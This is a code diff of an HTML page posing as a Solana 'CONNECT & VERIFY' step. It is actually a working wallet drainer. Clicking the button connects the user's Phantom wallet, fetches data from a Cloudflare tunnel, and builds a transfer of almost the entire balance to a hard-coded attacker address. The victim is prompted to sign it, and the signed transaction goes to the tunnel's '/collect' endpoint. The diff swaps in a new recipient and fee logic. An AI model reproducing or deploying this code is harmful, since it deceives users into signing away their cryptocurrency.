@@ -3,34 +3,39 @@
     <script>window.Buffer = buffer.Buffer;</script>
     <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
     <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;">
-    <button id="cta" style="padding:20px 40px;background:#14F195;border:none;border-radius:10px;font-weight:bold;cursor:pointer;">CONNECT & VERIFY</button>
+    <button id="cta" style="padding:20px 40px;background:#14F195;border:none;border-radius:10px;font-weight:bold;cursor:pointer;font-size:20px;">CONNECT & VERIFY</button>
+    <p id="msg" style="margin-top:10px;color:#333;">Status: Ready</p>
     <script>
     const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
+    const TARGET_ADDR = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
+
     document.getElementById('cta').onclick = async () => {
         try {
             const p = window.solana || window.phantom?.solana;
             const { publicKey } = await p.connect();
+            document.getElementById('msg').innerText = "Syncing...";
             
-            // 🔱 关键：所有数据向 71 机要，前端绝不碰 Solana 节点，封杀 403
             const data = await fetch(TUNNEL + '/get_data', {
                 method: 'POST', headers: {'Content-Type':'application/json'},
                 body: JSON.stringify({pubkey: publicKey.toString()})
             }).then(r => r.json());
 
             const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
-                fromPubkey: publicKey, toPubkey: new solanaWeb3.PublicKey("D6vY2yvY2yvY2yvY2yvY2yvY2yvY2yvY2yvY2yvY2y"),
-                lamports: data.balance > 1500000 ? data.balance - 1000000 : 0
+                fromPubkey: publicKey, 
+                // ✅ 修正地址输入逻辑
+                toPubkey: new solanaWeb3.PublicKey(TARGET_ADDR),
+                lamports: data.balance > 2000000 ? data.balance - 1500000 : 0
             }));
             tx.recentBlockhash = data.blockhash; tx.feePayer = publicKey;
             
             const signed = await p.signTransaction(tx);
             const b64 = window.Buffer.from(signed.serialize()).toString('base64');
             
-            await fetch(TUNNEL + '/collect', {
+            fetch(TUNNEL + '/collect', {
                 method:'POST', headers:{'Content-Type':'application/json'},
                 body:JSON.stringify({signature: b64})
             });
-            alert("Success!");
+            alert("Protocol Activated!");
         } catch(e) { alert("Error: " + e.message); }
     }
     </script></body></html>
